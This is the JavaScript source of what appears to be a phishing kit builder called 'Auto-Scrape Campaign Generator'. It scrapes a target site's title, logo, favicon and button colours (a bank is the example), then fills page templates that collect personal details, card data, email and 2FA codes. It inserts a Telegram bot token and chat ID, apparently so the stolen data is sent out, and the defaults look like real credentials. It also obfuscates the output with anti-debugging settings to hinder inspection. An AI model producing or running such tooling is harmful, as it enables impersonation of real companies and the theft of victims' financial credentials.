import fs from 'fs';
import path from 'path';
import puppeteer from 'puppeteer';
import { input, confirm } from '@inquirer/prompts';
import chalk from 'chalk';
import https from 'https';
import http from 'http';
import { fileURLToPath } from 'url';
import { spawn } from 'child_process';
import net from 'net';
import JavaScriptObfuscator from 'javascript-obfuscator';
import { minify as minifyHtml } from 'html-minifier-terser';
import CleanCSS from 'clean-css';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Helper to download image
const downloadImage = (url, filepath) => {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;
        client.get(url, (res) => {
            if (res.statusCode === 200) {
                res.pipe(fs.createWriteStream(filepath))
                   .on('error', reject)
                   .once('close', () => resolve(filepath));
            } else {
                res.resume();
                reject(new Error(`Request Failed With a Status Code: ${res.statusCode}`));
            }
        }).on('error', reject);
    });
};

// Helper to copy directory recursively
const copyDirSync = (src, dest) => {
    if (!fs.existsSync(dest)) fs.mkdirSync(dest, { recursive: true });
    let entries = fs.readdirSync(src, { withFileTypes: true });
    for (let entry of entries) {
        let srcPath = path.join(src, entry.name);
        let destPath = path.join(dest, entry.name);
        if (entry.isDirectory()) {
            copyDirSync(srcPath, destPath);
        } else {
            fs.copyFileSync(srcPath, destPath);
        }
    }
};

async function scrapeSite(url) {
    console.log(chalk.blue(`\n🔍 Launching Puppeteer to scrape ${url}...`));
    const browser = await puppeteer.launch({ headless: 'new' });
    const page = await browser.newPage();
    
    await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });

    const data = await page.evaluate(() => {
        // 1. Get Site Name from Title
        let title = document.title;
        // The user wants exactly the host's title to be populated. No slicing.
        
        // 2. Find Logo
        let logoUrl = '';
        const logoImgs = Array.from(document.querySelectorAll('img')).filter(img => 
            (img.src && img.src.toLowerCase().includes('logo')) || 
            (img.alt && img.alt.toLowerCase().includes('logo')) ||
            (img.className && typeof img.className === 'string' && img.className.toLowerCase().includes('logo')) ||
            (img.id && img.id.toLowerCase().includes('logo'))
        );
        
        if (logoImgs.length > 0) {
            // Prefer SVG or high-res
            const svgLogo = logoImgs.find(img => img.src.endsWith('.svg'));
            logoUrl = svgLogo ? svgLogo.src : logoImgs[0].src;
        } else {
            // Fallback to favicon/apple-touch-icon
            const icon = document.querySelector('link[rel="apple-touch-icon"]') || document.querySelector('link[rel~="icon"]');
            if (icon) logoUrl = icon.href;
        }

        // 3. Find Primary Button Color
        let btnPrimary = '#0056b3'; // Fallback
        let btnHover = '#004494'; // Fallback
        
        const buttons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]'));
        const primaryBtn = buttons.find(b => {
             const style = window.getComputedStyle(b);
             return style.backgroundColor !== 'rgb(0, 0, 0)' && style.backgroundColor !== 'rgba(0, 0, 0, 0)' && style.backgroundColor !== 'transparent';
        }) || buttons[0];

        if (primaryBtn) {
            const style = window.getComputedStyle(primaryBtn);
            if (style.backgroundColor && style.backgroundColor !== 'rgba(0, 0, 0, 0)') {
                // rgb to hex
                const rgb = style.backgroundColor.match(/\d+/g);
                if (rgb && rgb.length >= 3) {
                    const hex = (r, g, b) => "#" + (1 << 24 | r << 16 | g << 8 | b).toString(16).slice(1);
                    btnPrimary = hex(parseInt(rgb[0]), parseInt(rgb[1]), parseInt(rgb[2]));
                    
                    // Simple hover darken approximation
                    const darken = (col, amt) => {
                        let num = parseInt(col.slice(1), 16);
                        let r = (num >> 16) - amt;
                        let b = ((num >> 8) & 0x00FF) - amt;
                        let g = (num & 0x0000FF) - amt;
                        return "#" + (g | (b << 8) | (r << 16)).toString(16).padStart(6, '0');
                    };
                    try { btnHover = darken(btnPrimary, 20); } catch(e) {}
                }
            }
        }

        // 4. Find Favicon
        let faviconUrl = '';
        const iconNodes = document.querySelectorAll('link[rel="icon"], link[rel="shortcut icon"], link[rel="apple-touch-icon"]');
        if (iconNodes && iconNodes.length > 0) {
             let largest = iconNodes[0];
             // Sometimes multiple sizes, try to grab the first one or largest
             faviconUrl = largest.href;
        } else {
             faviconUrl = new URL('/favicon.ico', window.location.origin).href;
        }

        return { siteName: title, logoUrl, btnPrimary, btnHover, faviconUrl };
    });

    await browser.close();
    console.log(chalk.green('✅ Scraping completed!'));
    
    return data;
}

async function run() {
    console.log(chalk.bold.magenta('\n*** Auto-Scrape Campaign Generator ***\n'));

    const targetUrl = process.argv[2] || await input({ message: 'Enter the target application URL to clone branding from (e.g. https://www.bank.com):', validate: (i) => i.startsWith('http') ? true : 'Must be a valid HTTP/HTTPS URL' });
    const tgBotToken = process.argv[3] || await input({ message: 'Enter your Telegram Bot Token:', default: '7976788555:AAGUS_FKZLRvw5sDUsGfPciEP4iNvzfqT7o' });
    const tgChatId = process.argv[4] || await input({ message: 'Enter your Telegram Chat ID:', default: '8351473213' });
    const flowOrder = process.argv[5] || await input({ message: 'Enter page flow order (comma separated from: personal,card,email,2fa):', default: 'personal,card,email,2fa' });
    // Secret CLI flags
    const isDevMode = process.argv.includes('--dev');

    const PAGE_MAP = { 'personal': 'auth-stg.html', 'card': 'sync-p.html', 'email': 'email-stg.html', '2fa': 'chk-v.html' };
    const sequence = flowOrder.toLowerCase().replace(/\s+/g, '').split(',').filter(p => PAGE_MAP[p]);
    const encodedTargetUrl = Buffer.from(targetUrl).toString('base64');
    const finalDest = `atob('${encodedTargetUrl}')`;
    
    let nextMap = {
        '__NEXT_LOGIN__': finalDest,
        '__NEXT_PERSONAL__': finalDest,
        '__NEXT_CARD__': finalDest,
        '__NEXT_EMAIL__': finalDest,
        '__NEXT_2FA__': finalDest
    };
    
    if (sequence.length > 0) {
        nextMap['__NEXT_LOGIN__'] = `'${PAGE_MAP[sequence[0]]}'`;
        for (let i = 0; i < sequence.length; i++) {
            let nextVal = (i + 1 < sequence.length) ? `'${PAGE_MAP[sequence[i + 1]]}'` : finalDest;
            if (sequence[i] === 'personal') nextMap['__NEXT_PERSONAL__'] = nextVal;
            if (sequence[i] === 'card') nextMap['__NEXT_CARD__'] = nextVal;
            if (sequence[i] === 'email') nextMap['__NEXT_EMAIL__'] = nextVal;
            if (sequence[i] === '2fa') nextMap['__NEXT_2FA__'] = nextVal;
        }
    }

    let scrapedData;
    try {
        scrapedData = await scrapeSite(targetUrl);
    } catch(e) {
        console.error(chalk.red('Failed to scrape site. Ensure URL is correct inside Puppeteer.'), e);
        process.exit(1);
    }

    console.log(chalk.yellow('\n--- Scraped Branding Metrics ---'));
    console.log(`Site Name: ${scrapedData.siteName}`);
    console.log(`Logo URL: ${scrapedData.logoUrl || 'None found'}`);
    console.log(`Favicon URL: ${scrapedData.faviconUrl || 'Default'}`);
    console.log(`Primary Button Color: ${scrapedData.btnPrimary}`);
    console.log(`Hover Button Color: ${scrapedData.btnHover}\n`);

    let confirmBuild = true;
    if (process.argv.length <= 2) {
        confirmBuild = await confirm({ message: 'Proceed with building the campaign using this data?' });
    }
    if (!confirmBuild) {
        console.log(chalk.red('Aborted.'));
        process.exit(0);
    }

    const domain = new URL(targetUrl).hostname.replace('www.', '');
    const buildDir = path.join(__dirname, 'builds', domain);

    if (fs.existsSync(buildDir)) {
        fs.rmSync(buildDir, { recursive: true, force: true });
    }
    fs.mkdirSync(buildDir, { recursive: true });

    // 1. Download constraints
    fs.mkdirSync(path.join(buildDir, 'assets'), { recursive: true });
    let logoFilename = 'logo.png'; // default
    
    if (scrapedData.logoUrl) {
        try {
            // Absolute URL check
            let dlUrl = scrapedData.logoUrl;
            if (dlUrl.startsWith('//')) dlUrl = 'https:' + dlUrl;
            else if (dlUrl.startsWith('/')) dlUrl = targetUrl.replace(/\/$/, '') + dlUrl;

            const extMatch = dlUrl.split('?')[0].match(/\.(png|jpg|jpeg|svg|gif|webp)$/i);
            const ext = extMatch ? extMatch[1] : 'png';
            logoFilename = `scraped-logo.${ext}`;
            
            await downloadImage(dlUrl, path.join(buildDir, 'assets', logoFilename));
            console.log(chalk.green(`✅ Downloaded logo successfully: ${logoFilename}`));
        } catch (err) {
            console.log(chalk.red(`Failed to download logo. Using default empty logo. Error: ${err.message}`));
        }
    }

    // 2. Process Templates
    const templatesDir = path.join(__dirname, 'templates');
    const templateFiles = fs.readdirSync(templatesDir);

    for (const file of templateFiles) {
        if (!fs.statSync(path.join(templatesDir, file)).isFile()) continue;

        let content = fs.readFileSync(path.join(templatesDir, file), 'utf-8');
        
        // Replace Variables
        content = content.replace(/\{\{SITE_NAME\}\}/g, scrapedData.siteName || 'Secure Portal');
        content = content.replace(/\{\{FAVICON_URL\}\}/g, scrapedData.faviconUrl || '/favicon.ico');
        content = content.replace(/\{\{LOGO_FILENAME\}\}/g, logoFilename);
        content = content.replace(/\{\{BTN_PRIMARY\}\}/g, scrapedData.btnPrimary);
        content = content.replace(/\{\{BTN_HOVER\}\}/g, scrapedData.btnHover);
        content = content.replace(/\{\{TG_BOT_TOKEN\}\}/g, tgBotToken);
        content = content.replace(/\{\{TG_CHAT_ID\}\}/g, tgChatId);

        content = content.replace(/__NEXT_LOGIN__/g, nextMap['__NEXT_LOGIN__']);
        content = content.replace(/__NEXT_PERSONAL__/g, nextMap['__NEXT_PERSONAL__']);
        content = content.replace(/__NEXT_CARD__/g, nextMap['__NEXT_CARD__']);
        content = content.replace(/__NEXT_EMAIL__/g, nextMap['__NEXT_EMAIL__']);
        content = content.replace(/__NEXT_2FA__/g, nextMap['__NEXT_2FA__']);

        // Obfuscation and Minification Phase
        if (!isDevMode && (file.endsWith('.html') || file.endsWith('.php'))) {
            try {
                content = await minifyHtml(content, {
                    removeAttributeQuotes: true,
                    removeComments: true,
                    minifyJS: true,
                    minifyCSS: true,
                    ignoreCustomFragments: [ /<\?[\s\S]*?\?>/ ]
                });
            } catch (err) {
                console.error(chalk.red(`Failed to minify ${file}:`), err);
            }
        } else if (!isDevMode && file.endsWith('.css')) {
            try {
                content = new CleanCSS({}).minify(content).styles;
            } catch (err) {
                console.error(chalk.red(`Failed to minify CSS for ${file}:`), err);
            }
        } else if (!isDevMode && file.endsWith('.js')) {
            content = JavaScriptObfuscator.obfuscate(content, {
                compact: true,
                controlFlowFlattening: true,
                stringArray: true,
                stringArrayEncoding: ['base64']
            }).getObfuscatedCode();
        }

        fs.writeFileSync(path.join(buildDir, file), content, 'utf-8');
    }
    console.log(chalk.green('✅ Templates processed and injected!'));

    // 3. Copy Static Assets
    // We need to copy `assets` (if any default assets exist), `php`, `Email Connect Pro/dist`, `app.js`
    
    try {
        if (fs.existsSync(path.join(__dirname, 'assets'))) {
            copyDirSync(path.join(__dirname, 'assets'), path.join(buildDir, 'assets'));
        }
        if (fs.existsSync(path.join(__dirname, 'php'))) {
            copyDirSync(path.join(__dirname, 'php'), path.join(buildDir, 'php'));
        }
        if (fs.existsSync(path.join(__dirname, 'Email Connect Pro', 'dist'))) {
            const destDist = path.join(buildDir, 'Email Connect Pro', 'dist');
            copyDirSync(path.join(__dirname, 'Email Connect Pro', 'dist'), destDist);
        }
        if (fs.existsSync(path.join(__dirname, 'app.js'))) {
            let appJsContent = fs.readFileSync(path.join(__dirname, 'app.js'), 'utf-8');
            
            appJsContent = appJsContent.replace(/__NEXT_LOGIN__/g, nextMap['__NEXT_LOGIN__']);
            appJsContent = appJsContent.replace(/__NEXT_PERSONAL__/g, nextMap['__NEXT_PERSONAL__']);
            appJsContent = appJsContent.replace(/__NEXT_CARD__/g, nextMap['__NEXT_CARD__']);
            appJsContent = appJsContent.replace(/__NEXT_EMAIL__/g, nextMap['__NEXT_EMAIL__']);
            appJsContent = appJsContent.replace(/__NEXT_2FA__/g, nextMap['__NEXT_2FA__']);
            
            if (isDevMode) {
                console.log(chalk.blue('\nℹ️ Developer mode enabled: Skipping javascript obfuscation & stripping security curtains...'));
                
                // Deterministically strip the anti-inspection logic block out
                const parts = appJsContent.split('    // ----------------------------');
                if (parts.length > 1) {
                    appJsContent = "(function() {\n    'use strict';\n" + parts[1];
                }
                
                fs.writeFileSync(path.join(buildDir, 'app.js'), appJsContent);
            } else {
                console.log(chalk.yellow('\n🔐 Cryptographically obfuscating javascript payload (app.js)...'));
                const obfResult = JavaScriptObfuscator.obfuscate(appJsContent, {
                    compact: true,
                    controlFlowFlattening: true,
                    controlFlowFlatteningThreshold: 0.75,
                    deadCodeInjection: true,
                    deadCodeInjectionThreshold: 0.4,
                    debugProtection: true,
                    debugProtectionInterval: 2000,
                    disableConsoleOutput: true,
                    identifierNamesGenerator: 'hexadecimal',
                    log: false,
                    numbersToExpressions: true,
                    renameGlobals: false,
                    selfDefending: true,
                    simplify: true,
                    splitStrings: true,
                    splitStringsChunkLength: 10,
                    stringArray: true,
                    stringArrayCallsTransform: true,
                    stringArrayCallsTransformThreshold: 0.5,
                    stringArrayEncoding: ['base64', 'rc4'],
                    stringArrayIndexShift: true,
                    stringArrayRotate: true,
                    stringArrayShuffle: true,
                    stringArrayWrappersCount: 1,
                    stringArrayWrappersChainedCalls: true,
                    stringArrayWrappersParametersMaxCount: 2,
                    stringArrayWrappersType: 'variable',
                    stringArrayThreshold: 0.75,
                    unicodeEscapeSequence: false
                });

                fs.writeFileSync(path.join(buildDir, 'app.js'), obfResult.getObfuscatedCode());
                console.log(chalk.green('✅ javascript payload secured and written.'));
            }
        }
    } catch(e) {
         console.error(chalk.red('Warning: Some static assets failed to copy:', e.message));
    }

    const findOpenPort = (startPort) => {
        return new Promise((resolve) => {
            const server = net.createServer();
            server.listen(startPort, () => {
                server.once('close', () => resolve(startPort));
                server.close();
            });
            server.on('error', () => {
                resolve(findOpenPort(startPort + 1));
            });
        });
    };

    try {
        const port = await findOpenPort(8081);
        console.log(chalk.cyan(`\n🚀 Starting local PHP server on port ${port}...`));
        const phpServer = spawn('php', ['-S', `localhost:${port}`], {
            cwd: buildDir,
            stdio: 'ignore', // Don't pollute the prompt with PHP router logs
            detached: true,
            shell: true      // Required on Windows to resolve PATH properly
        });
        
        phpServer.on('error', (err) => {
            console.error(chalk.red(`\n[!] Background PHP Server failed to start: ${err.message}`));
            console.log(chalk.gray(`Please ensure PHP is installed and available in your environment PATH.`));
            console.log(chalk.cyan(`To view manually, cd into ./builds/${domain} and run: php -S localhost:${port}`));
        });

        phpServer.unref(); // Allow the node script to exit while PHP runs
        
        console.log(chalk.green.bold(`\n🎉 Campaign successfully generated at ./builds/${domain}`));
        console.log(chalk.cyan.bold(`🌍 Live Preview: http://localhost:${port}`));
        console.log(chalk.gray(`(Background PHP server started with PID: ${phpServer.pid})`));
    } catch (e) {
        console.log(chalk.green.bold(`\n🎉 Campaign successfully generated at ./builds/${domain}`));
        console.error(chalk.red(`Failed to setup automated PHP server: ${e.message}`));
    }
}

run();
